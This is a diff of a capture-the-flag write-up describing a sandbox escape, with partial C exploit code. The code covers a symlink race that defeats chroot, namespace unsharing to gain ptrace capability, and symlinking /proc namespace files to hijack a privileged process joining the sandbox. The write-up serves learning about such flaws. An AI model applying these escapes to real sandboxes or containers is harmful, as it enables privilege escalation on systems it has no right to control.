@@ -33,6 +33,8 @@ Then the child chroots to /tmp/chroots/<$sandbox_idx>.
 Finally the child changes its uid/gid to unprivileged user and calls execve on a provided binary.
 
 ```c
+// source.c 
+
 pid_t new_proc() {
     return syscall(SYS_CLONE, 
         CLONE_NEWNS | CLONE_NEWCGROUP | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWUSER | CLONE_NEWPID | CLONE_NEWNET, 
@@ -110,6 +112,8 @@ which is independent of the filesystem.
 How do they work? Well they are just referenced by socket name, that's all.
 
 ```c
+// receiver.c
+
 int listen_for_connection() {
     /* Create named socked in abstract namespace, as sandboxes doesn't share file system. */
     int rcv_sk = socket(AF_UNIX, SOCK_STREAM, 0);
@@ -171,6 +175,8 @@ and receiver has already access to file descriptor refering /tmp/chroots/1.
 Now we create a new sandbox. The main process clones and it's child will now first create a folder /tmp/chroots/<$sandbox_uid> and then chroot to it.
 
 ```c
+// source.c
+
 void mk_chroot_dir(char *path) {
     mkdir(path, 0);
     chmod(path, 777);
@@ -210,6 +216,8 @@ void start_sandbox() {
 So if receiver manages to quickly substitude /tmp/chroots/<$sandbox_uid> with symlink to /, the init process will escape the chroot as chroot("/") has no effect:
 
 ```c
+// receiver.c 
+
 void substitude_chroot_folder(int fd) {
     /* Wait for the /tmp/chroots/2 folder to be created. */
     while (unlinkat(fd, "../2", AT_REMOVEDIR) == -1) {}
@@ -226,6 +234,8 @@ Now we have an init process which sucessfully escaped chroot. But we must escala
 
 But there are few problems. First our init process has no CAP_SYS_PTRACE. In order to gain CAP_SYS_PTRACE it has to create a new user namespace.
 
+Again from user_namespace man page:
+
 ```
 The child process created by clone(2) with the CLONE_NEWUSER flag
 starts out with a complete set of capabilities in the new user
@@ -233,3 +243,80 @@ namespace. Likewise, a process that creates a new user namespace
 using unshare(2) or joins an existing user namespace using setns(2)
 gains a full set of capabilities in that namespace.
 ```
+
+But as we solved this problem we have a new one. Now our process is not an owner of init process pid namespace. 
+
+```
+When a nonuser namespace is created, it is owned by the user
+namespace in which the creating process was a member at the time of
+the creation of the namespace.  Privileged operations on resources
+governed by the nonuser namespace require that the process has the
+necessary capabilities in the user namespace that owns the nonuser
+amespace.
+```
+
+Again we can solve this problem by also adding CLONE_NEWPID namespace flag to clone, so that our new user namespace in which we have all capabilities can govern the resources of pid namespace.
+
+```c
+// init.c
+
+int gain_sys_ptrace_cap()
+{
+    /* Create new user namespace to gain capabilities. Create new pid namespace. It will be governed by the new user 
+    namespace and thus init process is able to SYS_PTRACE processes within it. */
+    if (unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWPID | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWCGROUP) == -1)
+    {
+        perror_wrapper("[!] unshare failed");
+        return -1;
+    }
+
+    return 0;
+}
+
+int main()
+{
+    char path[PATH_MAX];
+    printf("[i] pid: %d\n", getpid());
+
+    if (gain_sys_ptrace_cap() == -1)
+    {
+        return -1;
+    }
+
+    switch (child_pid = fork())
+    {
+        case 0:
+            /* Child process with ability to ptrace processes. */
+            [...]
+
+        case 1:
+            /* Parent. */
+            [...]
+```
+
+But again, by solving one, we reach another problem. Now the process which is joining sandbox will join the parent (init) process pid namespace, not the cloned child.
+
+And this is the most tricky part of the whole solution. Again respect for anyone who camed up with solution without hints.
+The process which joins the namespaces of sandboxed process does it in not most elegant way. Let me reming you how the pseudocode for it looks like:
+
+```c
+// source.c 
+
+char *namespaces[] = {"user", "mnt", "pid", "uts", "ipc", "cgroup"};
+void change_ns(pid_t sandbox, unsigned int sandbox_idx) {
+    char path[PAGE_SIZE];
+    int fd;
+    printf("[*] enterning namespaces of pid %d\n", sandbox);
+
+    for (int i = 0; i < namespaces / sizeof(char*); i++) {
+        sprintf(path, "/proc/%d/ns/%s", sandbox, namespaces[i]);
+        fd = open(path, O_RDONLY);
+        setns(fd, 0);
+    }
+    [...]
+}
+```
+
+So why is this not the most elegant way? Well, it just iterate over files in /proc/<$sandboxed_process_id>/ns/* files. And it starts with user, then mount namespace. And at this point, the joining process is in the same mount namespace as the init and it cloned child process. And as cloned child has CAP_SYS_ADMIN capability it can 
+can substitude files inside /proc/<$sandboxed_process_id>/ns/* with symlinks from to self /proc/<$sandboxed_process_cloned_child_id>/ns/*.
+
